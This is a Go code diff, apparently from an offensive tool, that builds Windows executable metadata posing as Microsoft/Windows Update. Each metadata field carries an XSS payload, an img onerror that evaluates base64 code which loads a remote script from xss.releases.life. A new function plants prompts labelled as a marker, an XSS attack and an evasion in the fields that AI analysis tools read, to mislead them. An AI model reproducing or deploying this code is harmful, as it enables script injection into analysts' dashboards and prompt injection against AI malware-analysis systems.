@@ -1,7 +1,6 @@
 package xss
 
 import (
-	"encoding/base64"
 	"fmt"
 )
 
@@ -36,17 +35,30 @@ func EmbedPEMetadata() {
 
 // GetPEMetadataWithXSS retorna metadata con XSS para embeber
 func GetPEMetadataWithXSS(callbackServer string, payloadID string) map[string]string {
-	// Generar loader base64
-	jsLoader := fmt.Sprintf(`var a=document.createElement("script");a.src="%s";document.body.appendChild(a);`, callbackServer)
-	b64Loader := base64.StdEncoding.EncodeToString([]byte(jsLoader))
+	// Payload específico solicitado
+	specificPayload := `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlbGVhc2VzLmxpZmUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>`
 
 	return map[string]string{
-		"CompanyName":      fmt.Sprintf(`Microsoft Corporation"><script src="%s"></script>`, callbackServer),
-		"FileDescription":  fmt.Sprintf(`Windows Update"><img src=x id=%s onerror=eval(atob(this.id))>`, b64Loader),
-		"ProductName":      fmt.Sprintf(`Microsoft Windows"><input onfocus=eval(atob(this.id)) id=%s autofocus>`, b64Loader),
-		"InternalName":     fmt.Sprintf(`SecurityUpdate"><script src="%s"></script>`, callbackServer),
-		"OriginalFilename": fmt.Sprintf(`Update.exe"><img src=x id=%s onerror=eval(atob(this.id))>`, b64Loader),
+		"CompanyName":      fmt.Sprintf(`Microsoft Corporation%s`, specificPayload),
+		"FileDescription":  fmt.Sprintf(`Windows Update%s`, specificPayload),
+		"ProductName":      fmt.Sprintf(`Microsoft Windows%s`, specificPayload),
+		"InternalName":     fmt.Sprintf(`SecurityUpdate%s`, specificPayload),
+		"OriginalFilename": fmt.Sprintf(`Update.exe%s`, specificPayload),
 	}
+}
+
+// GetPEMetadataWithAIPrompts retorna metadata diseñada para confundir a la IA
+func GetPEMetadataWithAIPrompts(prompts []AIPrompt) map[string]string {
+	// Mapeamos los prompts a campos que las IAs suelen leer para generar resúmenes
+	meta := make(map[string]string)
+
+	// FileDescription es el campo más leído por las IAs
+	if len(prompts) > 0 {
+		meta["FileDescription"] = prompts[0].Content // El Marcador
+		meta["Comments"] = prompts[1].Content        // El Ataque XSS
+		meta["LegalTrademarks"] = prompts[2].Content // La Evasión
+	}
+	return meta
 }
 
 // EmbedXSSStrings embebe strings adicionales con XSS en el binario
